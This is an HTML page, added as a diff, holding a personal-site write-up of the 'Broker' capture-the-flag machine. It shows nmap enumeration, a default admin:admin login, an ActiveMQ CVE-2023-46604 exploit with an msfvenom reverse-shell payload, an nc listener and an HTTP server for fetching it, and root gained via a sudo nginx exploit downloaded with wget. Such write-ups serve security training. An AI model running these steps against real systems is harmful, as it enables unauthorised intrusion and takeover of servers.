@@ -1,0 +1,361 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <meta property="og:description" content="rad0's personal site" />
+        <meta
+            property="og:image"
+            content="imgs/7652e48dfb6728e7b630db62de00c428.png"
+        />
+        <title>rad0 | writeups - Broker</title>
+        <link
+            rel="icon"
+            type="image/x-icon"
+            href="imgs/7652e48dfb6728e7b630db62de00c428.ico"
+        />
+        <link rel="stylesheet" href="writeup_style.css" />
+        <link
+            rel="stylesheet"
+            href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"
+        />
+        <link
+            href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap"
+            rel="stylesheet"
+        />
+    </head>
+    <body>
+        <div class="container">
+            <header>
+                <a href="/">/about</a>
+                <a href="/writeups">/writeups</a>
+                <a href="/ctf">/ctf</a>
+                <a href="/thm">/thm</a>
+            </header>
+            <div class="content">
+                <div class="path">/home/rad0/writeups/Broker</div>
+                <div class="machine">
+                    <div class="description">
+                        <h3 class="name">Broker</h3>
+                        <p class="difficulty">
+                            <i class="fa-solid fa-chart-simple"></i>easy
+                        </p>
+                    </div>
+                    <img
+                        class="avatar"
+                        src="../imgs/writeups/a725533911ba94a880899fbf900d988c.png"
+                    />
+                </div>
+                <div class="writeup">
+                    <h3 id="enumeration">Enumeration</h3>
+                    <div class="text">
+                        <p>
+                            Let’s start by scanning the target using
+                            <span class="cmd">nmap</span>.
+                        </p>
+                    </div>
+                    <div class="command">
+                        <div class="input">
+                            <p>
+                                <span style="color: #23fd00; user-select: none"
+                                    >&gt; </span
+                                >sudo nmap -sV -p- 10.10.11.243
+                            </p>
+                        </div>
+                        <div class="output">
+                            <p>
+                                <span class="rownum">1 </span>Nmap scan report
+                                for 10.10.11.243<br />
+                                <span class="rownum">2 </span>Host is up (0.032s
+                                latency).<br />
+                                <span class="rownum">3 </span>Not shown: 65526
+                                closed tcp ports (reset)<br />
+                                <span class="rownum">4 </span>PORT STATE SERVICE
+                                VERSION<br />
+                                <span class="rownum">5 </span>22/tcp open ssh
+                                OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux;
+                                protocol 2.0)<br />
+                                <span class="rownum">6 </span>80/tcp open http
+                                nginx 1.18.0 (Ubuntu)<br />
+                                <span class="rownum">7 </span>1883/tcp open
+                                mqtt<br />
+                                <span class="rownum">8 </span>5672/tcp open
+                                amqp?<br />
+                                <span class="rownum">9 </span>8161/tcp open http
+                                Jetty 9.4.39.v20210325<br />
+                                <span class="rownum">10</span>41627/tcp open
+                                tcpwrapped<br />
+                                <span class="rownum">11</span>61613/tcp open
+                                stomp Apache ActiveMQ<br />
+                                <span class="rownum">12</span>61614/tcp open
+                                http Jetty 9.4.39.v20210325<br />
+                                <span class="rownum">13</span>61616/tcp open
+                                apachemq ActiveMQ OpenWire transport 5.15.15q
+                                ActiveMQ OpenWire transport 5.15.15<br />
+                            </p>
+                        </div>
+                    </div>
+                    <div class="text">
+                        <p>
+                            It seems there is a website running on port 80.
+                            Let’s check it out.
+                        </p>
+                    </div>
+                    <p>
+                        <img
+                            src="../imgs/writeups/21cbb727ae25dac9e4074fcec9cc4a01.png"
+                            class="image"
+                        />
+                    </p>
+                    <div class="text">
+                        <p>
+                            Looks like a default login page. We can try some
+                            commonly used usernames and passwords and see if we
+                            have any luck.
+                        </p>
+                    </div>
+                    <div class="text">
+                        <p>
+                            Yup, the combination
+                            <span class="cmd">admin: admin</span> works and
+                            reveals what looks like an ActiveMQ dashboard.
+                        </p>
+                    </div>
+                    <h3 id="exploitation">Exploitation</h3>
+                    <div class="text">
+                        <p>
+                            Browsing the dashboard, I have confirmed that the
+                            site uses ActiveMQ 5.15.15 as suggested by nmap.
+                            After a quick google search I have found an
+                            <a
+                                href="https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ"
+                                target="_blank"
+                                >exploit</a
+                            >
+                            written in Go we can use to get a reverse shell.
+                            We’ll need to download the files
+                            <span class="cmd">main.go</span> and
+                            <span class="cmd">poc-linux.xml</span>. Now we just
+                            need to follow the instructions provided by the
+                            author.
+                        </p>
+                    </div>
+                    <div class="text">
+                        <p>First we need to create the payload.</p>
+                    </div>
+                    <div class="command">
+                        <div class="input">
+                            <p>
+                                <span style="color: #23fd00; user-select: none"
+                                    >&gt; </span
+                                >msfvenom -p linux/x64/shell_reverse_tcp
+                                LHOST={your vpn ip} LPORT={listener port} -f elf
+                                -o test.elf
+                            </p>
+                        </div>
+                    </div>
+                    <div class="text">
+                        <p>
+                            Don’t forget to change
+                            <span class="cmd">poc-linux.xml</span> according to
+                            the guide.
+                        </p>
+                    </div>
+                    <div class="text">
+                        <p>
+                            Now let’s start an HTTP server in the directory of
+                            the payload.
+                        </p>
+                    </div>
+                    <div class="command">
+                        <div class="input">
+                            <p>
+                                <span style="color: #23fd00; user-select: none"
+                                    >&gt; </span
+                                >python3 -m http.server 8008
+                            </p>
+                        </div>
+                    </div>
+                    <div class="text">
+                        <p>
+                            All that’s left now is to start a listener on the
+                            port we specified while creating the payload and
+                            running <span class="cmd">main.go</span>.
+                        </p>
+                    </div>
+                    <div class="command">
+                        <div class="input">
+                            <p>
+                                <span style="color: #23fd00; user-select: none"
+                                    >&gt; </span
+                                >nc -lvnp 3333
+                            </p>
+                        </div>
+                    </div>
+                    <div class="command">
+                        <div class="input">
+                            <p>
+                                <span style="color: #23fd00; user-select: none"
+                                    >&gt; </span
+                                >go run main.go -i 10.10.11.243 -u http://{your
+                                vpn ip}:8008/poc-linux.xml
+                            </p>
+                        </div>
+                    </div>
+                    <div class="text">
+                        <p>
+                            We have successfully received a shell. Now we can
+                            retrieve the <span class="cmd">user.txt</span> flag.
+                        </p>
+                    </div>
+                    <div class="command">
+                        <div class="input">
+                            <p>
+                                <span style="color: #23fd00; user-select: none"
+                                    >&gt; </span
+                                >cat /home/activemq/user.txt
+                            </p>
+                        </div>
+                        <div class="output">
+                            <p>41e6a7f8************************</p>
+                        </div>
+                    </div>
+                    <h3 id="privilege-escalation">Privilege Escalation</h3>
+                    <div class="text">
+                        <p>
+                            First, I would like to get a more stable shell. We
+                            can achieve this by running the following command
+                            inside the shell.
+                        </p>
+                    </div>
+                    <div class="command">
+                        <div class="input">
+                            <p>
+                                <span style="color: #23fd00; user-select: none"
+                                    >&gt; </span
+                                >script /dev/null -c bash
+                            </p>
+                        </div>
+                    </div>
+                    <div class="text">
+                        <p>
+                            We can also <span class="cmd">cd</span> into the
+                            <span class="cmd">/home/activemq</span> directory.
+                        </p>
+                    </div>
+                    <div class="text">
+                        <p>
+                            Let’s see what commands we can run with sudo
+                            permissions.
+                        </p>
+                    </div>
+                    <div class="command">
+                        <div class="input">
+                            <p>
+                                <span style="color: #23fd00; user-select: none"
+                                    >&gt; </span
+                                >sudo -l
+                            </p>
+                        </div>
+                        <div class="output">
+                            <p>
+                                <span class="rownum">1</span>Matching Defaults
+                                entries for activemq on broker:<br />
+                                <span class="rownum">2</span> env_reset,
+                                mail_badpass,<br />
+                                <span class="rownum">3</span>
+                                secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin,<br />
+                                <span class="rownum">4</span> use_pty<br />
+                                <span class="rownum">5</span><br />
+                                <span class="rownum">6</span>User activemq may
+                                run the following commands on broker:<br />
+                                <span class="rownum">7</span> (ALL : ALL)
+                                NOPASSWD: /usr/sbin/nginx<br />
+                            </p>
+                        </div>
+                    </div>
+                    <div class="text">
+                        <p>
+                            We can run
+                            <span class="cmd">/usr/sbin/nginx</span> with sudo
+                            permissions without providing a password. After a
+                            quick google search, I have found this
+                            <a
+                                href="https://github.com/DylanGrl/nginx_sudo_privesc"
+                                target="_blank"
+                                >exploit</a
+                            >. We can download it on the target machine using
+                            the same HTTP server as before.
+                        </p>
+                    </div>
+                    <div class="command">
+                        <div class="input">
+                            <p>
+                                <span style="color: #23fd00; user-select: none"
+                                    >&gt; </span
+                                >wget http://{your vpn ip}:8008/exploit.sh
+                            </p>
+                        </div>
+                    </div>
+                    <div class="text">
+                        <p>
+                            Don’t forget to add the execute permission to the
+                            file.
+                        </p>
+                    </div>
+                    <div class="command">
+                        <div class="input">
+                            <p>
+                                <span style="color: #23fd00; user-select: none"
+                                    >&gt; </span
+                                >chmod +x exploit.sh
+                            </p>
+                        </div>
+                    </div>
+                    <div class="text">
+                        <p>
+                            After running the exploit, a ssh key is generated.
+                            We can use the default directory and we do not need
+                            to provide a passphrase. It’s important to add the
+                            <span class="cmd">600</span> permission to the key.
+                        </p>
+                    </div>
+                    <div class="command">
+                        <div class="input">
+                            <p>
+                                <span style="color: #23fd00; user-select: none"
+                                    >&gt; </span
+                                >chmod 600 /home/activemq/.ssh/id_rsa
+                            </p>
+                        </div>
+                    </div>
+                    <div class="command">
+                        <div class="input">
+                            <p>
+                                <span style="color: #23fd00; user-select: none"
+                                    >&gt; </span
+                                >ssh -i /home/activemq/.ssh/id_rsa
+                                root@localhost
+                            </p>
+                        </div>
+                    </div>
+                    <div class="text">
+                        <p>We successfully got the root permissions.</p>
+                    </div>
+                    <div class="command">
+                        <div class="input">
+                            <p>
+                                <span style="color: #23fd00; user-select: none"
+                                    >&gt; </span
+                                >cat /root/root.txt
+                            </p>
+                        </div>
+                        <div class="output">
+                            <p>45b65f6c************************</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </body>
+</html>
